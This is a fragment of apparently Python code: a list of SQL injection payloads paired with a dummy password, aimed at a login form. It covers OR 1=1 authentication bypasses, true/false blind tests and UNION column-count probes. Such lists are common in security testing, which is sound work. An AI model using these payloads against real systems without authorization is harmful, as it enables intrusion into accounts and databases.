    ("admin' OR 1=1 -- -", "anything"),
    ("admin' OR 1=1#", "anything"),
    ("admin' OR '1'='1' LIMIT 1 -- -", "anything"),
    # AND false vs AND true
    ("admin' AND 1=1 -- -", "anything"),  # Should behave differently if blind
    ("admin' AND 1=2 -- -", "anything"),  # Should behave differently if blind
    # Union-based test
    ("admin' UNION SELECT 1 -- -", "anything"),
    ("admin' UNION SELECT 1,2 -- -", "anything"),
    ("admin' UNION SELECT 1,2,3 -- -", "anything"),
    # Double quotes
    ('admin" OR "1"="1" -- -', "anything"),
]

